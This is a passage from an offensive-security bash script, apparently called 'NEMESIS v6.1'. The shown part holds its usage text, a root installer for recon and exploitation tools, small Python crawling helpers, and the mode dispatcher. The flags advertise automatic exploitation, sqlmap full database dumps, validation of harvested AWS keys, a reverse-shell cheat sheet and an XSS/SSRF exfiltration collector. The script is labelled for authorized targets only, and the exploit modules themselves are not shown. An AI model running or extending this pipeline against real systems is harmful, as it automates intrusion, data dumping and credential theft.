    gowitness scan file -f "$W/subs/live_hosts.txt" --screenshot-path "$W/screenshots" --threads 8 --timeout 12 --db-path "$W/screenshots/gowitness.sqlite3" >/dev/null 2>&1 || true
  fi

  if [[ "$F_VERIFY_ONLY" == true ]]; then
    step "VERIFY-ONLY — exploit queue held"
    log W "--verify-only: $(qcount total) findings verified; exploit queue NOT executed"
    log S "queue preview:"
    for row in "${EXPLOITS[@]+"${EXPLOITS[@]}"}"; do echo -e "  ${G}→${N} $row" >> "$LOG"; done
    for row in "${EXPLOITS[@]+"${EXPLOITS[@]}"}"; do log H "$row"; done
  else
    run_exploits
  fi
  gen_report
}

# ─────────────────────────── MODE DISPATCH ───────────────────────────
usage() { cat <<'USG'
BUG FRAMEWORK NEMESIS v6.1 — NOISE-ZERO (authorized targets only)

USAGE:
  bug <domain> [flags]            full pipeline
  bug <domain> --mode <m>         single module
  bug --install                   install toolchain + this binary

MODES (-m): sub one url web js fuzz ports vuln nuclei xss sqli ssrf lfi csrf cors idor oauth tech waf api pmf report scope
FLAGS:
  -d <file>       scope file (extra subdomains)
  -c <cookie>     session cookie
  -p <proxy>      proxy (http://127.0.0.1:8080)
  -H <header>     extra header (repeatable)
  --deep          aggressive: full ffuf wordlist + sqlmap --dump
  --quick         recon + nuclei only, no exploit
  --parallel      run nuclei/ffuf concurrently
  --strict        medium findings go to findings.txt
  --verify-only   verify + queue exploits, do not execute
  --verify-keys   validate harvested AWS keys with sts
  --shell         write reverse-shell cheat sheet on CMDi hit
  --collector <u> xss/ssrf exfil endpoint
  --headless      run with zero interactive output
  --rate <n>      max requests/sec
  --dump          sqlmap full dump (alias of --deep)
  --no-exploit    recon/verify only
  --resume        skip stages with existing output
  --debug         verbose logging
  -v              version
USG
}

install_toolchain() {
  echo "[*] NEMESIS installer — Kali/Debian toolchain"
  [[ $EUID -eq 0 ]] || { echo "[!] run as root: sudo bug --install"; exit 1; }
  apt-get update -qq
  apt-get install -y -qq curl jq git python3-pip dnsutils netcat-openbsd 2>/dev/null
  GO_BIN=/usr/local/go/bin/go; [[ -x "$GO_BIN" ]] || GO_BIN=$(command -v go || true)
  if [[ -z "$GO_BIN" ]]; then
    echo "[*] installing go…"; wget -qO /tmp/go.tgz https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
    tar -C /usr/local -xzf /tmp/go.tgz; GO_BIN=/usr/local/go/bin/go
  fi
  export PATH=$PATH:/root/go/bin:$(go env GOPATH 2>/dev/null)/bin
  for t in subfinder httpx nuclei katana dalfox ffuf gau waybackurls assetfinder gowitness; do
    command -v "$t" >/dev/null 2>&1 || GO_INSTALL=1
  done
  [[ "${GO_INSTALL:-0}" == "1" ]] && {
    "$GO_BIN" install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
    "$GO_BIN" install github.com/projectdiscovery/httpx/cmd/httpx@latest
    "$GO_BIN" install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
    "$GO_BIN" install github.com/projectdiscovery/katana/cmd/katana@latest
    "$GO_BIN" install github.com/hahwul/dalfox/v2@latest
    "$GO_BIN" install github.com/ffuf/ffuf/v2@latest
    "$GO_BIN" install github.com/lc/gau/v2/cmd/gau@latest
    "$GO_BIN" install github.com/tomnomnom/waybackurls@latest
    "$GO_BIN" install github.com/tomnomnom/assetfinder@latest
    "$GO_BIN" install github.com/sensepost/gowitness@latest
  }
  command -v sqlmap >/dev/null 2>&1 || apt-get install -y -qq sqlmap 2>/dev/null || pip3 install -q sqlmap 2>/dev/null || true
  command -v wafw00f >/dev/null 2>&1 || pip3 install -q wafw00f 2>/dev/null || true
  command -v whatweb >/dev/null 2>&1 || apt-get install -y -qq whatweb 2>/dev/null || true
  command -v amass >/dev/null 2>&1 || apt-get install -y -qq amass 2>/dev/null || true
  [[ -d /usr/share/seclists ]] || { echo "[*] cloning seclists…"; git clone -q --depth 1 https://github.com/danielmiessler/SecLists /usr/share/seclists; }
  nuclei -update-templates -silent 2>/dev/null || true
  echo "[✔] toolchain ready. Re-login or: export PATH=\$PATH:/root/go/bin"
}

# ─────────────────────────── EMBEDDED PYTHON HELPERS ───────────────────────────
write_helpers() {
  mkdir -p "$W/.py"
  # helper 1: js_paths (paths only — no scheme/host)
  cat > "$W/.py/js_paths.py" <<'JSP'
import os,re,sys
PATHS=set()
for f in sys.argv[1:]:
    if not os.path.isfile(f): continue
    try: s=open(f,encoding="utf-8",errors="ignore").read()
    except: continue
    for m in re.finditer(r'["\'](/[^"\']{2,250})["\']',s):
        p=m.group(1)
        if p.startswith("//"): continue
        if re.search(r'\.(png|jpe?g|gif|svg|ico|css|woff2?|ttf|eot|map|mp[34]|webm|zip|gz|pdf|min\.js)$',p,re.I): continue
        if re.search(r'(node_modules|webpack|polyfill|vendor|bootstrap|jquery|analytics)',p,re.I): continue
        p=p.split("?")[0].split("#")[0]
        if len(p)>=3 and p not in ("/","//"): PATHS.add(p)
for p in sorted(PATHS): print(p)
JSP
  # helper 2: active filter (strip CDN/unreachable hosts)
  cat > "$W/.py/active.py" <<'ACTP'
import socket,sys
for line in sys.stdin:
    h=line.strip().split("/")[2] if "//" in line else line.strip()
    if not h: continue
    try: socket.getaddrinfo(h,443,proto=socket.IPPROTO_TCP); print(line.strip())
    except: pass
ACTP
  # helper 3: form scrape (extract action+inputs for CSRF/fuzz)
  cat > "$W/.py/form_scrape.py" <<'FSP'
import re,sys,urllib.request
for u in sys.argv[1:]:
    try: h=urllib.request.urlopen(u,timeout=8); s=h.read().decode("utf-8","ignore")
    except: continue
    for m in re.finditer(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>',s,re.S|re.I):
        a=m.group(1); ins=re.findall(r'<input[^>]*name=["\']([^"\']+)["\']',m.group(2),re.I)
        print(f"{u}|{a}|{','.join(ins)}")
FSP
  # helper 4: js downloader
  cat > "$W/.py/js_dl.py" <<'JDL'
import os,sys,urllib.request
for u in sys.argv[1:]:
    try:
        d=urllib.request.urlopen(u,timeout=10).read()
        f=os.path.join(sys.argv[0].rsplit("/",1)[0],"raw",u.split("/")[-1][:80].replace("?","_"))
        open(f,"wb").write(d); print(f)
    except: pass
JDL
  chmod +x "$W/.py/"*.py
}

# ─────────────────────────── ARGS ───────────────────────────
MODE=""; MODES=()
while [[ $# -gt 0 ]]; do
  case "$1" in
    --install) F_INSTALL=true ;;
    --deep|--dump) F_DEEP=true; EXP_DUMP=true ;;
    --quick) F_QUICK=true ;;
    --parallel) F_PARALLEL=true ;;
    --verify-only) F_VERIFY_ONLY=true ;;
    --verify-keys) F_VERIFY_KEYS=true ;;
    --shell) F_SHELL=true ;;
    --collector) COLLECTOR="$2"; shift ;;
    --headless) F_SILENT=true; F_BANNER=false ;;
    --rate) RATE="$2"; shift ;;
    --no-exploit) F_NO_EXPLOIT=true ;;
    --resume) F_RESUME=true ;;
    --debug) F_DEBUG=true ;;
    --strict) F_STRICT=true ;;
    -d) SCOPE_FILE="$2"; shift ;;
    -c) COOKIE="$2"; shift ;;
    -p) PROXY="$2"; shift ;;
    -H) HDRS+=("$2"); shift ;;
    -m|--mode) MODE="$2"; shift ;;
    -v|--version) echo "NEMESIS v$VERSION"; exit 0 ;;
    -h|--help) usage; exit 0 ;;
    -*) log E "unknown flag: $1"; usage; exit 1 ;;
    *) [[ -z "$DOMAIN" ]] && DOMAIN="$1" || DOMAIN="$DOMAIN $1" ;;
  esac
  shift
done
[[ -z "$DOMAIN" && "$F_INSTALL" != true ]] && { usage; exit 1; }
[[ -n "$MODE" ]] && { MODES=("$MODE"); G_FULL=false; } || G_FULL=true

if [[ "$F_INSTALL" == true ]]; then install_toolchain; exit 0; fi
for d in $DOMAIN; do :; done
DOMAIN=$(echo "$DOMAIN" | tr ' ' '\n' | head -1)
W="$WS_BASE/$DOMAIN"; EX="$W/exploits"; LOG="$W/master.log"
mkdir -p "$W" "$EX"; write_helpers
[[ "$F_BANNER" == true ]] && {
  echo -e "${M}┌──────────────────────────────────────────┐"
  echo -e "│  ${W2}NEMESIS v$VERSION${M} — ${C}${NAME}${M}          │"
  echo -e "│  ${D}NOISE-ZERO · auto-verify · auto-exploit${M} │"
  echo -e "└──────────────────────────────────────────┘${N}"
  echo -e "${D}target:${N} ${G}$DOMAIN${N}  workspace: ${G}$W${N}"
}

# ─────────────────────────── MODE ROUTER ───────────────────────────
case "$MODE" in
  sub)    : > "$W/subs/all.txt"
          subfinder -d "$DOMAIN" -silent 2>/dev/null >> "$W/subs/all.txt" || true
          assetfinder --subs-only "$DOMAIN" 2>/dev/null >> "$W/subs/all.txt" || true
          echo "$DOMAIN" >> "$W/subs/all.txt"; u "$W/subs/all.txt"
          log OK "subs: $(cnt "$W/subs/all.txt") → $W/subs/all.txt" ;;
  one)    probe "https://$DOMAIN"; echo -e "code=${RC} len=${RL}"; echo "$RB" | head -30 ;;
  url)    stage_urls ;;
  web)    stage_web; mod_sqli_verify; mod_lfi_ssrf_cmdi_ssti; mod_idor_bac; mod_csrf_cors_redirect; mod_jwt_verify; mod_takeover ;;
  js)     stage_js_paths ;;
  fuzz)   stage_fuzz ;;
  ports)  has nmap && nmap -Pn -sV -T4 --top-ports 1000 "$DOMAIN" -oN "$W/ports.txt" 2>/dev/null | tail -20 || log W "nmap missing" ;;
  vuln|nuclei) stage_nuclei ;;
  xss)    stage_web ;;
  sqli)   mod_sqli_verify ;;
  ssrf)   mod_lfi_ssrf_cmdi_ssti ;;
  lfi)    mod_lfi_ssrf_cmdi_ssti ;;
  csrf)   mod_csrf_cors_redirect ;;
  cors)   mod_csrf_cors_redirect ;;
  idor)   mod_idor_bac ;;
  oauth)  mod_jwt_verify ;;
  tech)   stage_web ;;
  waf)    stage_waf ;;
  api)    stage_api ;;
  pmf)    stage_param_fuzz ;;
  report) gen_report ;;
  scope)  cat "$W/subs/live.txt" 2>/dev/null | sed 's|^https\?://||;s|/.*||' | sort -u ;;
  *)      run_pipeline ;;
esac

if [[ "$F_VERIFY_ONLY" == true && "$MODE" != "report" ]]; then
  log S "QUEUE (held — use without --verify-only to execute):"
  for row in "${EXPLOITS[@]+"${EXPLOITS[@]}"}"; do log H "$row"; done
fi
[[ "$F_SILENT" == false && -z "$MODE" ]] && echo -e "${G}Done in $(( ($(date +%s)-START)/60 ))m → ${W}${N}"
exit 0
NEMESIS_EOF

chmod +x /usr/local/bin/bug
echo "✔ NEMESIS v6.1 assembled: $(wc -l < /usr/local/bin/bug) lines — run: bug example.com"
